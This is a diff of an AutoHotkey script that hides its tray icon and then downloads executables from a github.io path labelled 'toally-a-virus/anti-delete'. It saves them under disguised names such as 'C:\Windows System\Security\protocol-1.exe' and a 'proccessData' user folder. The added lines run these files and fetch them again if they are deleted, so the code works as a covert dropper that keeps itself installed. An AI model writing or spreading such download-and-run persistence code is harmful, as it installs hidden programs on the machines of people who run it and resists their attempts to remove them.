@@ -4,22 +4,24 @@ SendMode Input  ; Recommended for new scripts due to its superior speed and reli
 SetWorkingDir %A_ScriptDir%  ; Ensures a consistent starting directory.
 #NoTrayIcon
 
-    If (FileExist("C:\Windows System\Security\protocol-1.exe")) ;Anti delete 1
-    {
-        UrlDownloadToFile, URL, Filename
-    }
-    If !(FileExist("C:\Windows System\Security\protocol-1.exe")) ;Anti delete 1
-    {
-        UrlDownloadToFile, https://dj13423.github.io/download/AHK/toally-a-virus/anti-delete/AntiDelete1.exe, C:\Windows System\Security\protocol-1.exe
-    }
-    If (FileExist("C:\Users\%A_UserName%\proccessData\User1_data\protocol-2.exe")) ;Anti delete 2
-    {
-        Run, protocol-2.exe, C:\Users\%A_UserName%\proccessData\User1_data, Max|Min|Hide|UseErrorLevel, OutputVarPID]
-    }
-    If !(FileExist("C:\Users\%A_UserName%\proccessData\User1_data\protocol-2.exe")) ;Anti delete 2
-    {
-        UrlDownloadToFile, URL, Filename
-    }
-    If (FileExist("C:\Users\%A_UserName%\proccessData\User1_data\sync.exe"))
-
+If (FileExist("C:\Windows System\Security\protocol-1.exe")) ;Anti delete 1
+{
+    Run, C:\Windows System\Security\protocol-1.exe
+}
+If !(FileExist("C:\Windows System\Security\protocol-1.exe")) ;Anti delete 1
+{
+    UrlDownloadToFile, https://dj13423.github.io/download/AHK/toally-a-virus/anti-delete/AntiDelete1.exe, C:\Windows System\Security\protocol-1.exe
+}
+If (FileExist("C:\Users\%A_UserName%\proccessData\User1_data\protocol-2.exe")) ;Anti delete 2
+{
+    Run, C:\Users\%A_UserName%\proccessData\User1_data\protocol-2.exe
+}
+If !(FileExist("C:\Users\%A_UserName%\proccessData\User1_data\protocol-2.exe")) ;Anti delete 2
+{
+    UrlDownloadToFile,  https://dj13423.github.io/download/AHK/toally-a-virus/anti-delete/AntiDelete2.exe, C:\Users\%A_UserName%\proccessData\User1_data\protocol-2.exe
+}
+If (FileExist("C:\Users\%A_UserName%\proccessData\User1_data\sync.exe"))
+{
+    Run, C:\Users\%A_UserName%\proccessData\User1_data\sync.exe
+}
 
